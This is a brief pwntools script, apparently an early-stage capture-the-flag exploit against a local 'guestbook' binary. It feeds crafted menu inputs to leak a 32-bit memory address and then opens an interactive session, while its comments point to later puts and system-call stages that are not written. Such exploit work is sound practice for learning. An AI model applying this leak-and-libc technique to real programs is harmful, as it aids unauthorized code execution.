from pwn import *

# leak

# puts call

# system call

gdbcmds = '''
	b *readName+51
	c
	'''
# 	b *main+443
elf = context.binary = ELF("./guestbook")
libc = elf.libc
target = process("./guestbook")
#target = gdb.debug('./guestbook', gdbscript=gdbcmds)

target.recvuntil(b">>>")
target.sendline(b"nam")
target.recvuntil(b">>>")
target.sendline(b"nam")
target.recvuntil(b">>>")
target.sendline(b"nam")
target.recvuntil(b">>>")
target.sendline(b"nam")

target.recvuntil(b">>")
target.sendline(b"1")
target.recvuntil(b">>>")
target.sendline(b"33")
leak = target.recv()
print(leak)
leak = leak.strip()[:-1]
leak = u32(b"\x00"*(len(leak)-4)+leak)
print(hex(leak))


target.interactive()
